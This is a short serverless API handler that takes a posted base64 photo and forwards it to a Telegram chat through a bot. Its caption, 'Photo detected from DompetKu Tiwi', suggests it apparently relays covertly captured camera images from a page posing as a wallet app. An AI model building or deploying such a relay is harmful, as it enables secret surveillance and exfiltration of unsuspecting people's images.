export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { image } = req.body;
  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!image || !BOT_TOKEN || !CHAT_ID) {
    return res.status(400).json({ error: 'Data atau konfigurasi tidak lengkap' });
  }

  try {
    const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
    const buffer = Buffer.from(base64Data, 'base64');

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'capture.jpg');
    formData.append('caption', '📷 Foto terdeteksi dari DompetKu Tiwi!');

    const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });

    const result = await telegramRes.json();
    return res.status(200).json({ success: true, result });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}
